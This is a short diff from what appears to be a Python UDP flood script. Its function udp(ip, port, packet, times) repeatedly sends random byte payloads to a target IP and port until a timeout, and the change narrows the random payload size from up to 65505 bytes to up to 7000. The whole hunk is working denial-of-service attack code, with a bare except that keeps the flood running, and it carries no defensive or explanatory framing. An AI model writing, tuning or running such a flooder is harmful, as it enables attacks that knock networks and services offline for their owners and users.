@@ -38,7 +38,7 @@ def udp(ip, port, packet, times):
   while time.time() < timeout:
     try:
       try:
-        data = random._urandom(int(random.randint(1025, 65505)))
+        data = random._urandom(int(random.randint(1025, 7000)))
         for _ in range(packet):
           s.sendto(data, (str(ip), int(port)))
       except:
